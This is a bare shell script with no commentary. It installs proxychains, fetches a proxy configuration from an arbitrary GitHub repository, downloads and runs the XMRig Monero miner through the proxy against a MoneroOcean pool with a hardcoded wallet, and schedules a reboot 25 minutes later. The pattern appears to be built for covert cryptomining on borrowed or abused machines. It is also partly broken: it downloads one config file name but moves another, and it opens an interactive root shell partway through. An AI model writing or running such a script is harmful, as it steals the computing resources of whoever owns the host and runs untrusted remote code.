#!/bin/sh
sudo -i
sudo apt-get update
sudo apt-get install -y proxychains tar
wget https://raw.githubusercontent.com/cuongptp1/123/master/sock/41/proxychains.conf
mv proxychains1.conf /etc/proxychains.conf
wget https://github.com/MoneroOcean/xmrig/releases/download/v6.5.2-mo1/xmrig-v6.5.2-mo1-lin64.tar.gz
tar --extract --file xmrig-v6.5.2-mo1-lin64.tar.gz
cd xmrig-6.5.2
export PROXY_DNS_SERVER=1.1.1.1
proxychains ./xmrig --no-color --donate-level 1 --cpu-priority 5 -o  gulf.moneroocean.stream:10128 -u 483NjkJRvjeNhTcd9Gqk3d7FmrsR5NTHm8wu2rvKpWyXQdUK3qAeXhiLA6kQZUk7KnMarQwmbRUkxSDPrBK3z2Ra1hoEEKL -p 1 x -a cn/r -t 4 -k --tls -B
sudo shutdown -r +25


